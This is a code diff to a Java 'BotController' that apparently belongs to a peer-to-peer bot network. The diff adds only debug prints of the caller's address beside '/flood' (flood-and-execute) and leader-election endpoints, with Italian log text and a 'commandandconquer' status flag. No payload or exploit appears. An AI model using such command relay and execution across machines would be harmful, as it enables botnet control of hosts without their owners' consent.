@@ -56,6 +56,11 @@ public class BotController {
 	@RequestMapping(value = "/flood", method = RequestMethod.POST)
 	public Boolean msgFlood(@RequestBody String msg, HttpServletRequest req) {
 
+
+		 System.out.println("non lo mando a addr: " + req.getRemoteAddr());
+		 System.out.println("host: " + req.getRemoteHost());
+
+		
 		IP ip = new IP(req.getRemoteAddr());
 		System.out.println("Richiesta di Flood ricevuta da " + ip.toString());
 		bhv.floodAndExecute(msg, ip);
@@ -67,7 +72,7 @@ public class BotController {
 		System.out.println("Richiesta di Elezione ricevuta da" + req.getRemoteAddr());
 		if (bhv.getpServ().getNewKing().equals("") && nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {
 
-			 System.out.println("non lo mando a addr: " + req.getRemoteAddr());
+			 System.out.println("addr: " + req.getRemoteAddr());
 			 System.out.println("host: " + req.getRemoteHost());
 
 			bhv.getPower(req.getRemoteAddr());
